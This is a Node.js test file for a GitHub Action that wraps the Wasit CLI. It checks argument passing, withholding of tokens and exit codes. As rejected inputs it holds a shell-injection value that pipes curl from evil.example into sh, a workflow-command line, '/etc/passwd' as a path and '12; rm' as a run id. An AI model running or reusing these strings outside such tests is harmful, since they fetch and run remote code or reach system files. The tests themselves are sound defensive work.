/**
 * `scripts/wasit.mjs`, the three steps of the Action that run Wasit (check the
 * inputs, run, report), first against a fake CLI that records what it was given,
 * then against the real built CLI and a service on 127.0.0.1 (`npm run build`
 * first). The Action is a thin wrapper: every decision is the CLI's, so what is
 * held here is that the wrapper passes the right arguments, hands over nothing it
 * should not (no token), and returns the CLI's exit code unchanged.
 *
 * Every key and token below is made up. Nothing leaves 127.0.0.1.
 */

import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { existsSync } from "node:fs";
import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { after, before, describe, it } from "node:test";

import { COMMENT_MARKER } from "../../packages/core/dist/ci-report.js";
import { main } from "../scripts/wasit.mjs";

const ACTION_DIR = fileURLToPath(new URL("..", import.meta.url));
const SCRIPT = path.join(ACTION_DIR, "scripts", "wasit.mjs");

/** Runs main() and collects what it printed. */
async function runMain(command, env) {
  const out = [];
  const err = [];
  const code = await main(command, env, { stdout: (line) => out.push(line), stderr: (line) => err.push(line) });
  return { code, stdout: out.join("\n"), stderr: err.join("\n") };
}

describe("wasit.mjs check", () => {
  let temp;
  before(async () => {
    temp = await mkdtemp(path.join(tmpdir(), "wasit-action-check-"));
  });
  after(async () => {
    await rm(temp, { recursive: true, force: true });
  });

  const env = () => ({ RUNNER_TEMP: temp, INPUT_CONFIG: "wasit.config.json", INPUT_TIER: "read-only", GITHUB_EVENT_NAME: "pull_request" });

  it("accepts the defaults and makes the working directory under the runner's temp directory", async () => {
    const result = await runMain("check", env());
    assert.equal(result.code, 0, result.stderr);
    assert.ok(existsSync(path.join(temp, "wasit")));
  });

  it("accepts the payment tier: whether the event may pay is the CLI's to say", async () => {
    const result = await runMain("check", { ...env(), INPUT_TIER: "payment" });
    assert.equal(result.code, 0, result.stderr);
  });

  it("refuses pull_request_target, exit 2", async () => {
    const result = await runMain("check", { ...env(), GITHUB_EVENT_NAME: "pull_request_target" });
    assert.equal(result.code, 2);
    assert.match(result.stderr, /pull_request_target/);
  });

  it("refuses an endpoint name that is shell text, and does not print it back as a command", async () => {
    const result = await runMain("check", { ...env(), INPUT_ENDPOINTS: "a; curl evil.example | sh\n::set-output name=x::1" });
    assert.equal(result.code, 2);
    for (const line of result.stderr.split("\n")) assert.ok(!/^\s*(::|##\[)/.test(line), line);
  });

  it("refuses to run without a temp directory, rather than writing somewhere else", async () => {
    const { RUNNER_TEMP: _omitted, ...rest } = env();
    assert.equal((await runMain("check", rest)).code, 2);
  });
});

describe("wasit.mjs run and report, with a fake CLI", () => {
  let root;
  let temp;
  let record;

  before(async () => {
    root = await mkdtemp(path.join(tmpdir(), "wasit-action-fake-"));
    temp = path.join(root, "runner-temp");
    record = path.join(root, "record.json");
    await mkdir(path.join(root, "action"), { recursive: true });
    await mkdir(path.join(root, "packages", "cli", "dist"), { recursive: true });
    await mkdir(path.join(temp, "wasit", "baseline"), { recursive: true });
    await writeFile(
      path.join(root, "packages", "cli", "dist", "index.js"),
      `const { appendFileSync, writeFileSync } = require("node:fs");
appendFileSync(${JSON.stringify(record)}, JSON.stringify({ argv: process.argv.slice(2), env: process.env }) + "\\n");
if (process.env.FAKE_WAIT) {
  process.on("SIGTERM", () => { writeFileSync(${JSON.stringify(path.join(root, "got-sigterm"))}, "1"); process.exit(143); });
  writeFileSync(${JSON.stringify(path.join(root, "started"))}, "1");
  setInterval(() => {}, 1000);
} else {
  process.exit(Number(process.env.FAKE_EXIT ?? 0));
}
`,
    );
  });
  after(async () => {
    await rm(root, { recursive: true, force: true });
  });

  const env = (overrides = {}) => ({
    PATH: process.env.PATH,
    RUNNER_TEMP: temp,
    ACTION_PATH: path.join(root, "action"),
    INPUT_CONFIG: "wasit.config.json",
    INPUT_ENVIRONMENT: "",
    INPUT_TIER: "read-only",
    INPUT_ENDPOINTS: "",
    GITHUB_EVENT_NAME: "pull_request",
    ...overrides,
  });
  const lastCall = async () => {
    const lines = (await readFile(record, "utf-8")).trim().split("\n");
    return JSON.parse(lines.at(-1));
  };
  const clearRecord = () => writeFile(record, "");

  it("run: calls the CLI once with the fixed arguments, from the action's own checkout", async () => {
    await clearRecord();
    const result = await runMain("run", env());
    assert.equal(result.code, 0, result.stderr);
    const call = await lastCall();
    assert.deepEqual(call.argv, ["run", "--read-only", "--start-if-local", "--json", "--out", path.join(temp, "wasit", "report.json"), "--config", "wasit.config.json"]);
    assert.equal((await readFile(record, "utf-8")).trim().split("\n").length, 1);
  });

  it("run: passes the environment, the endpoints and a baseline that is a file under the temp directory", async () => {
    await clearRecord();
    const baseline = path.join(temp, "wasit", "baseline", "baseline.json");
    await writeFile(baseline, "{}");
    await runMain("run", env({ INPUT_ENVIRONMENT: "staging", INPUT_ENDPOINTS: "a,b", BASELINE_PATH: baseline }));
    assert.deepEqual((await lastCall()).argv.slice(6), ["--baseline", baseline, "--config", "wasit.config.json", "--env", "staging", "--endpoint", "a", "--endpoint", "b"]);
  });

  it("run: leaves --baseline out when the path is empty, is not there, or is outside the temp directory", async () => {
    await writeFile(path.join(root, "outside.json"), "{}");
    for (const BASELINE_PATH of ["", path.join(temp, "wasit", "baseline", "missing.json"), path.join(root, "outside.json"), "/etc/passwd"]) {
      await clearRecord();
      await runMain("run", env({ BASELINE_PATH }));
      assert.ok(!(await lastCall()).argv.includes("--baseline"), BASELINE_PATH || "(empty)");
    }
  });

  it("run: gives the CLI no token, in any form, although the step was given one", async () => {
    await clearRecord();
    await runMain(
      "run",
      env({
        GH_TOKEN: "canary-gh-token",
        GITHUB_TOKEN: "canary-github-token",
        ACTIONS_RUNTIME_TOKEN: "canary-runtime-token",
        ACTIONS_ID_TOKEN_REQUEST_TOKEN: "canary-id-token",
        KEEP_ME: "kept",
        WASIT_HEADER_X_API_KEY: "header-value-for-the-cli",
      }),
    );
    const { env: seen } = await lastCall();
    assert.equal(seen.KEEP_ME, "kept");
    assert.equal(seen.WASIT_HEADER_X_API_KEY, "header-value-for-the-cli", "what the workflow set for Wasit still reaches Wasit");
    assert.ok(!JSON.stringify(seen).includes("canary"), "no token reached the CLI");
  });

  it("run: returns the exit code of the CLI unchanged: 0, 1 and 2", async () => {
    for (const code of [0, 1, 2]) {
      await clearRecord();
      const result = await runMain("run", env({ FAKE_EXIT: String(code) }));
      assert.equal(result.code, code);
    }
  });

  it("run: the payment tier calls the CLI without --read-only, and with no key flag", async () => {
    await clearRecord();
    await runMain("run", env({ INPUT_TIER: "payment" }));
    const argv = (await lastCall()).argv;
    assert.equal(argv[0], "run");
    assert.ok(!argv.includes("--read-only"));
    assert.ok(!argv.some((arg) => /key|secret|mainnet/i.test(arg)), argv.join(" "));
  });

  it("run: exits 2 when the CLI is not where the action's checkout says (the install did not happen)", async () => {
    const result = await runMain("run", env({ ACTION_PATH: path.join(root, "nowhere", "action") }));
    assert.equal(result.code, 2);
    assert.match(result.stderr, /not built|install/i);
  });

  it("report: calls ci-report with the report, the comment and the next baseline", async () => {
    await clearRecord();
    await runMain("report", env());
    const w = (name) => path.join(temp, "wasit", name);
    assert.deepEqual((await lastCall()).argv, [
      "ci-report",
      "--report",
      w("report.json"),
      "--comment",
      w("comment.md"),
      "--baseline-out",
      w("baseline-next.json"),
      "--check-run",
      w("check-run.json"),
    ]);
  });

  it("report: adds the baseline when there is one, and gives the CLI no token", async () => {
    await clearRecord();
    const baseline = path.join(temp, "wasit", "baseline", "baseline.json");
    await writeFile(baseline, "{}");
    await runMain("report", env({ BASELINE_PATH: baseline, GH_TOKEN: "canary-gh-token" }));
    const call = await lastCall();
    assert.deepEqual(call.argv.slice(-2), ["--baseline", baseline]);
    assert.ok(!JSON.stringify(call.env).includes("canary"));
  });

  it("report: adds the history and the compared run when they are a file under the temp directory and a run id (D-022b)", async () => {
    await clearRecord();
    const baseline = path.join(temp, "wasit", "baseline", "baseline.json");
    await writeFile(baseline, "{}");
    await mkdir(path.join(temp, "wasit", "history"), { recursive: true });
    const history = path.join(temp, "wasit", "history", "baseline.json");
    await writeFile(history, "{}");
    await runMain("report", env({ BASELINE_PATH: baseline, HISTORY_PATH: history, BASELINE_RUN: "43724229283" }));
    const argv = (await lastCall()).argv;
    assert.equal(argv[argv.indexOf("--history") + 1], history);
    assert.equal(argv[argv.indexOf("--baseline-run") + 1], "43724229283");
  });

  it("report: leaves out a history outside the temp directory, and a run id that is not one", async () => {
    for (const [HISTORY_PATH, BASELINE_RUN] of [["/etc/passwd", "12; rm"], [path.join(root, "outside.json"), "-1"], ["", ""]]) {
      await clearRecord();
      await runMain("report", env({ HISTORY_PATH, BASELINE_RUN }));
      const argv = (await lastCall()).argv;
      assert.ok(!argv.includes("--history") && !argv.includes("--baseline-run"), `${HISTORY_PATH} ${BASELINE_RUN}`);
    }
  });

  it("report: returns the exit code of the CLI", async () => {
    await clearRecord();
    assert.equal((await runMain("report", env({ FAKE_EXIT: "2" }))).code, 2);
  });

  it("run: passes a SIGTERM on to the CLI, which stops the service, and exits with what the CLI exits with", async () => {
    await rm(path.join(root, "started"), { force: true });
    await rm(path.join(root, "got-sigterm"), { force: true });
    const child = spawn(process.execPath, [SCRIPT, "run"], { env: { ...env(), FAKE_WAIT: "1" }, stdio: ["ignore", "pipe", "pipe"] });
    const closed = new Promise((resolve) => child.on("close", (code, signal) => resolve({ code, signal })));
    for (let waited = 0; !existsSync(path.join(root, "started")) && waited < 100; waited += 1) await new Promise((resolve) => setTimeout(resolve, 50));
    assert.ok(existsSync(path.join(root, "started")), "the CLI started");
    child.kill("SIGTERM");
    const result = await closed;
    assert.equal(result.code, 143);
    assert.ok(existsSync(path.join(root, "got-sigterm")), "the CLI got the signal");
  });

  it("an unknown command exits 2", async () => {
    assert.equal((await runMain("deploy", env())).code, 2);
  });
});

/** Runs `node wasit.mjs <command>` as the workflow does, and returns its exit code and output. */
function runScript(command, env, cwd) {
  return new Promise((resolve, reject) => {
    const child = spawn(process.execPath, [SCRIPT, command], { cwd, env, stdio: ["ignore", "pipe", "pipe"] });
    let stdout = "";
    let stderr = "";
    child.stdout.on("data", (chunk) => (stdout += chunk));
    child.stderr.on("data", (chunk) => (stderr += chunk));
    child.on("error", reject);
    child.on("close", (code) => resolve({ code, stdout, stderr }));
  });
}

const CHALLENGE = Buffer.from(
  JSON.stringify({
    x402Version: 2,
    resource: { url: "http://127.0.0.1/paid" },
    accepts: [
      {
        scheme: "exact",
        network: "stellar:testnet",
        amount: "10000",
        asset: "CBIELTK6YBZJU5UP2WWQEUCYKLPU6AUNZ2BQ4WWFEIE3USCIHMXQDAMA",
        payTo: "GBNCC3VFT7PGUMGDQU5O35SXVWWTAHCO4LFFWLYFBLQCD56DNWYWM6ZS",
        maxTimeoutSeconds: 60,
      },
    ],
  }),
).toString("base64");

describe("the Action's scripts with the real CLI", () => {
  let root;
  let workspace;
  let temp;
  let summary;
  const built = existsSync(path.join(ACTION_DIR, "..", "packages", "cli", "dist", "index.js"));

  before(async () => {
    root = await mkdtemp(path.join(tmpdir(), "wasit-action-real-"));
    workspace = path.join(root, "workspace");
    temp = path.join(root, "runner-temp");
    summary = path.join(root, "step-summary.md");
    await mkdir(workspace, { recursive: true });
    await mkdir(temp, { recursive: true });
    await writeFile(summary, "");
  });
  after(async () => {
    await rm(root, { recursive: true, force: true });
  });

  /** A service the Action starts: v2 challenge, or an x402 v1 body challenge, and it dumps its environment. */
  async function writeService(name, port, v1) {
    const script = path.join(workspace, `${name}.mjs`);
    const envFile = path.join(root, `${name}.env.json`);
    await writeFile(
      script,
      `import http from "node:http";
import { writeFileSync } from "node:fs";
http.createServer((req, res) => {
  writeFileSync(${JSON.stringify(envFile)}, JSON.stringify(process.env));
  ${
    v1
      ? `res.writeHead(402, { "content-type": "application/json" }); res.end(JSON.stringify({ x402Version: 1, accepts: [{ scheme: "exact", network: "stellar:testnet" }] }));`
      : `res.writeHead(402, { "payment-required": ${JSON.stringify(CHALLENGE)} }); res.end("{}");`
  }
}).listen(${port}, "127.0.0.1");
`,
    );
    await writeFile(
      path.join(workspace, `${name}.config.json`),
      JSON.stringify({
        version: 1,
        service: { start: `node ${name}.mjs`, ready: { url: `http://127.0.0.1:${port}/`, timeoutSeconds: 20 } },
        defaultEnvironment: "local",
        environments: { local: { baseUrl: `http://127.0.0.1:${port}`, network: "stellar:testnet", operatedByMe: true } },
        endpoints: [{ name: "weather", protocol: "x402", path: "/api/weather", method: "GET" }],
      }),
    );
    return { config: `${name}.config.json`, envFile };
  }

  /** The event file of a push to main, as the runner writes it. */
  async function pushEvent() {
    const file = path.join(root, "push-event.json");
    await writeFile(file, JSON.stringify({ ref: "refs/heads/main", repository: { default_branch: "main" } }));
    return file;
  }

  const stepEnv = (extra = {}) => ({
    PATH: process.env.PATH,
    HOME: root,
    RUNNER_TEMP: temp,
    ACTION_PATH: ACTION_DIR,
    GITHUB_STEP_SUMMARY: summary,
    GITHUB_EVENT_NAME: "pull_request",
    INPUT_TIER: "read-only",
    INPUT_ENVIRONMENT: "",
    INPUT_ENDPOINTS: "",
    ...extra,
  });

  async function freePort() {
    const { createServer } = await import("node:net");
    return new Promise((resolve) => {
      const probe = createServer();
      probe.listen(0, "127.0.0.1", () => {
        const { port } = probe.address();
        probe.close(() => resolve(port));
      });
    });
  }

  it("a push to main: check, run, report, with the service started, no token in its environment, and the baseline written", { skip: !built && "run npm run build first" }, async () => {
    const { config, envFile } = await writeService("good", await freePort(), false);
    const env = stepEnv({
      INPUT_CONFIG: config,
      GITHUB_EVENT_NAME: "push",
      // A push the payment gate reads as one to the default branch: a key on any other run is refused (D-022a).
      GITHUB_REF: "refs/heads/main",
      GITHUB_EVENT_PATH: await pushEvent(),
      GH_TOKEN: "canary-gh-token",
      GITHUB_TOKEN: "canary-github-token",
      WASIT_HEADER_X_API_KEY: "canary-header-value",
      STELLAR_PRIVATE_KEY: "canary-stellar-key",
      GITHUB_ENV: path.join(root, "fake-github-env"),
      GITHUB_PATH: path.join(root, "fake-github-path"),
      GITHUB_OUTPUT: path.join(root, "fake-github-output"),
    });
    assert.equal((await runScript("check", env, workspace)).code, 0);

    const run = await runScript("run", env, workspace);
    assert.equal(run.code, 0, run.stderr);
    const report = JSON.parse(await readFile(path.join(temp, "wasit", "report.json"), "utf-8"));
    assert.equal(report.endpoints[0].outcome, "conformant");
    assert.ok(!(await readFile(path.join(temp, "wasit", "report.json"), "utf-8")).includes("canary"));

    const seen = JSON.parse(await readFile(envFile, "utf-8"));
    assert.ok(!JSON.stringify(seen).includes("canary"), "the service saw no token, no key and no header value");
    for (const name of ["GITHUB_ENV", "GITHUB_PATH", "GITHUB_OUTPUT", "GITHUB_STEP_SUMMARY"]) {
      assert.equal(seen[name], undefined, `${name} is a file the runner reads after the step: not for the service`);
    }

    const write = await runScript("report", env, workspace);
    assert.equal(write.code, 0, write.stderr);
    const comment = await readFile(path.join(temp, "wasit", "comment.md"), "utf-8");
    assert.equal(comment.split("\n")[0], COMMENT_MARKER);
    assert.match(comment, /Wasit: ✅ conformant/);
    assert.match(await readFile(summary, "utf-8"), /Wasit: ✅ conformant/, "the job summary was written");
    const next = JSON.parse(await readFile(path.join(temp, "wasit", "baseline-next.json"), "utf-8"));
    assert.equal(next.history.weather["X402-01"], "P");
  });

  it("a pull request that turns the paywall into x402 v1: the run fails with 1, against the baseline from main", { skip: !built && "run npm run build first" }, async () => {
    // The baseline the earlier step would have downloaded: the file main uploaded.
    const downloaded = path.join(temp, "wasit", "baseline");
    await mkdir(downloaded, { recursive: true });
    await writeFile(path.join(downloaded, "baseline.json"), await readFile(path.join(temp, "wasit", "baseline-next.json")));

    const { config } = await writeService("v1", await freePort(), true);
    const env = stepEnv({ INPUT_CONFIG: config, BASELINE_PATH: path.join(downloaded, "baseline.json") });

    const run = await runScript("run", env, workspace);
    assert.equal(run.code, 1, run.stderr);
    assert.match(run.stderr, /regression against main/);

    const write = await runScript("report", env, workspace);
    assert.equal(write.code, 0, write.stderr);
    const comment = await readFile(path.join(temp, "wasit", "comment.md"), "utf-8");
    assert.match(comment, /Wasit: ❌ regression/);
    assert.match(comment, /Regression: weather was conformant on main and is now unsupported/);
  });

  it("without a baseline the same v1 paywall is exit 2: nothing could be graded", { skip: !built && "run npm run build first" }, async () => {
    const { config } = await writeService("v1b", await freePort(), true);
    const run = await runScript("run", stepEnv({ INPUT_CONFIG: config }), workspace);
    assert.equal(run.code, 2, run.stderr);
  });

  it("a service that exits at once: the run fails with 2, and the report step still replaces the comment with no verdict", { skip: !built && "run npm run build first" }, async () => {
    // Earlier tests left a report, a comment and a baseline in the shared work directory; a real job starts empty.
    for (const name of ["report.json", "comment.md", "baseline-next.json"]) await rm(path.join(temp, "wasit", name), { force: true });
    await writeFile(summary, "");
    const port = await freePort();
    await writeFile(
      path.join(workspace, "dead.config.json"),
      JSON.stringify({
        version: 1,
        service: { start: "node -e 0", ready: { url: `http://127.0.0.1:${port}/`, timeoutSeconds: 10 } },
        defaultEnvironment: "local",
        environments: { local: { baseUrl: `http://127.0.0.1:${port}`, network: "stellar:testnet", operatedByMe: true } },
        endpoints: [{ name: "weather", protocol: "x402", path: "/api/weather", method: "GET" }],
      }),
    );
    const env = stepEnv({ INPUT_CONFIG: "dead.config.json", GITHUB_EVENT_NAME: "push" });

    const run = await runScript("run", env, workspace);
    assert.equal(run.code, 2, run.stderr);
    assert.equal(existsSync(path.join(temp, "wasit", "report.json")), false, "the run wrote no report");

    const write = await runScript("report", env, workspace);
    assert.equal(write.code, 0, write.stderr);
    const comment = await readFile(path.join(temp, "wasit", "comment.md"), "utf-8");
    assert.equal(comment.split("\n")[0], COMMENT_MARKER, "same marker, so the earlier comment is the one that is replaced");
    assert.match(comment, /Wasit: ⚠️ no verdict\./);
    assert.match(await readFile(summary, "utf-8"), /Wasit: ⚠️ no verdict\./, "the job summary says it too");
    assert.equal(existsSync(path.join(temp, "wasit", "baseline-next.json")), false, "a run that graded nothing is never a baseline");
  });

  it("refuses mainnet: true in the check step, exit 2, and writes the refusal to the job summary (B5: the report says so)", async () => {
    await writeFile(summary, "");
    const check = await runScript("check", stepEnv({ INPUT_CONFIG: "x.json", INPUT_MAINNET: "true", GITHUB_EVENT_NAME: "push" }), workspace);
    assert.equal(check.code, 2, check.stderr);
    assert.match(check.stderr, /^Wasit: mainnet: true is refused: the mainnet opt-in is not part of this version\./);
    assert.match(check.stderr, /this run's event is push\./);
    const written = await readFile(summary, "utf-8");
    assert.match(written, /^## Wasit: refused\n\nmainnet: true is refused: the mainnet opt-in is not part of this version\./);
    assert.match(written, /Nothing was installed, started, sent or signed\./);
  });

  it("refuses mainnet: true in the run step as well, before the CLI runs: no report is written", async () => {
    await rm(path.join(temp, "wasit", "report.json"), { force: true });
    const run = await runScript("run", stepEnv({ INPUT_CONFIG: "x.json", INPUT_MAINNET: "true", GITHUB_EVENT_NAME: "workflow_dispatch" }), workspace);
    assert.equal(run.code, 2, run.stderr);
    assert.match(run.stderr, /mainnet: true is refused/);
    assert.equal(existsSync(path.join(temp, "wasit", "report.json")), false, "the CLI ran");
  });

  it("accepts the payment tier and refuses pull_request_target as a process", async () => {
    assert.equal((await runScript("check", stepEnv({ INPUT_CONFIG: "x.json", INPUT_TIER: "payment" }), workspace)).code, 0);
    assert.equal((await runScript("check", stepEnv({ INPUT_CONFIG: "x.json", GITHUB_EVENT_NAME: "pull_request_target" }), workspace)).code, 2);
    assert.equal((await runScript("check", stepEnv({ INPUT_CONFIG: "x.json", INPUT_TIER: "mainnet" }), workspace)).code, 2);
  });
});
